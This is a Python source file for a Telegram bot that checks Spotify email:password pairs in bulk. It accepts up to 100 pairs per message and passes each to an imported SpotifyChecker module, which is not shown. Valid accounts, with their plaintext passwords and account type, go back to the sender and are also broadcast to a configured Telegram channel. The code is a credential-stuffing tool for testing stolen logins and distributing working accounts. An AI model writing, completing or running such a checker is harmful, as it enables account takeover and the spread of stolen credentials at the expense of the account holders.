# bot.py
import logging
import asyncio
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode
from spotify_checker import SpotifyChecker

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_GROUP_OR_CHANNEL_ID"

logging.basicConfig(level=logging.INFO)
checker = SpotifyChecker()

async def send_to_channel(app, message: str):
    try:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        print(f"[!] Telegram Error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = (
        f"👋 Hello, *{user.first_name or 'User'}*\\!\n\n"
        f"📥 Send Spotify accounts in the format:\n"
        "`email@example.com:password`\n\n"
        f"⚠️ Max: *100 accounts per message*"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text.strip()
    lines = [line.strip() for line in message.splitlines() if ":" in line]

    if len(lines) == 0:
        await update.message.reply_text("❗ Send credentials as `email:password`", parse_mode="Markdown")
        return
    if len(lines) > 100:
        await update.message.reply_text("⚠️ Max 100 accounts per message.", parse_mode="Markdown")
        return

    await checker.initialize()

    valid = 0
    invalid = 0

    await update.message.reply_text(f"🔍 Checking *{len(lines)}* accounts...", parse_mode="Markdown")

    for i, line in enumerate(lines, 1):
        try:
            email, password = map(str.strip, line.split(":", 1))
            success, status = await checker.check_account(email, password)
            if success:
                valid += 1
                msg = (
                    f"*Spotify Account Found\\!*\\n"
                    f"📧 `{email}`\\n"
                    f"🔐 `{password}`\\n"
                    f"💳 Type: *{status}*"
                )
                await update.message.reply_text(msg, parse_mode="MarkdownV2")
                await send_to_channel(context.application, msg)
            else:
                invalid += 1
        except Exception as e:
            invalid += 1
            print(f"[!] Error on line {i}: {e}")

    if valid == 0:
        await update.message.reply_text("❌ No valid accounts found.", parse_mode="Markdown")

    await update.message.reply_text(f"✅ *{valid}* valid | ❌ *{invalid}* invalid", parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
